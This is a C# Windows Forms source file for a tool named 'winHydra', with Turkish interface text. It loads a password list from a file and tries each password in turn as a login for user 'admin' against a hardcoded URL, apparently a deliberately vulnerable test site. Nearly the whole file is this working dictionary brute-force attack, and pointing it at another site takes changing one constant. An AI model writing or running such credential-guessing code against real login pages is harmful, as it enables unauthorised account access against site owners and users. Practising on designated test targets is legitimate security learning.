using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winHydra
{
    public partial class Form3 : Form
    {
        private HttpClient _httpClient;
        private List<string> loadedPasswords = new List<string>();
        private CancellationTokenSource _cancellationTokenSource;

        private const string TargetUrl = "http://testasp.vulnweb.com/"; // Hedef URL
        private const string Username = "admin"; // Sabit kullanıcı adı

        public Form3()
        {
            InitializeComponent();
            _httpClient = new HttpClient();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Form1 frm = new Form1();
            frm.ShowDialog();
            this.Close();
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            if (loadedPasswords.Count == 0)
            {
                MessageBox.Show("Lütfen bir şifre listesi yükleyin!");
                return;
            }

            label6.Text = "İşlem başlatıldı...";
            button4.BackColor = Color.Gray; // Durum başlatıldığında nötr renk
            button4.Text = "Durum"; // Varsayılan metin

            _cancellationTokenSource = new CancellationTokenSource(); // Yeni bir iptal kaynağı oluştur

            foreach (var password in loadedPasswords)
            {
                // İptal kontrolü
                if (_cancellationTokenSource.Token.IsCancellationRequested)
                {
                    label6.Text = "İşlem durduruldu.";
                    return;
                }

                var result = await TryLogin(TargetUrl, Username, password);

                if (result)
                {
                    richTextBox2.AppendText($"Şifre denendi: {password} - **BAŞARILI**\n");
                    MessageBox.Show($"Doğru Şifre Bulundu: {password}");
                    label6.Text = "İşlem tamamlandı.";
                    UpdateStatusButton(true); // Başarı durumunu güncelle
                    return;
                }
                else
                {
                    richTextBox2.AppendText($"Şifre denendi: {password} - Başarısız\n");
                    UpdateStatusButton(false); // Başarısız durumu güncelle
                }
            }

            label6.Text = "Şifre bulunamadı.";
        }

        private async void button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Text Files|*.txt",
                Title = "Şifre Listesi Seç"
            };

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    loadedPasswords = File.ReadAllLines(openFileDialog.FileName).ToList();

                    if (loadedPasswords.Count > 0)
                    {
                        MessageBox.Show($"{loadedPasswords.Count} adet şifre yüklendi.");
                        richTextBox1.Text = string.Join(Environment.NewLine, loadedPasswords);
                    }
                    else
                    {
                        MessageBox.Show("Seçilen dosyada herhangi bir şifre bulunamadı.");
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Dosya yüklenirken bir hata oluştu: {ex.Message}");
                }
            }
        }

        private async Task<bool> TryLogin(string url, string username, string password)
        {
            try
            {
                var content = new FormUrlEncodedContent(new[]
                {
                    new KeyValuePair<string, string>("username", username),
                    new KeyValuePair<string, string>("password", password)
                });

                var response = await _httpClient.PostAsync(url, content);

                if (response.IsSuccessStatusCode)
                {
                    string responseContent = await response.Content.ReadAsStringAsync();
                    if (responseContent.Contains("Hoş geldiniz") || responseContent.Contains("Login Successful"))
                    {
                        return true;
                    }
                }
            }
            catch (Exception ex)
            {
                richTextBox2.AppendText($"Bir hata oluştu: {ex.Message}\n");
            }

            return false;
        }

        private void UpdateStatusButton(bool isSuccess)
        {
            if (isSuccess) // Eğer işlem başarılıysa
            {
                button4.BackColor = Color.Green; // Renk yeşil
                button4.Text = "Başarılı";       // Metin "Başarılı"
            }
            else // Eğer işlem başarısızsa
            {
                button4.BackColor = Color.Red;  // Renk kırmızı
                button4.Text = "Başarısız";     // Metin "Başarısız"
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if (_cancellationTokenSource != null)
            {
                _cancellationTokenSource.Cancel(); // İşlemi durdur
                label6.Text = "İşlem durduruldu.";
                button4.BackColor = Color.Gray; // Durumu nötr hale getir
                button4.Text = "Durum"; // Varsayılan metin
            }
        }
    }
}
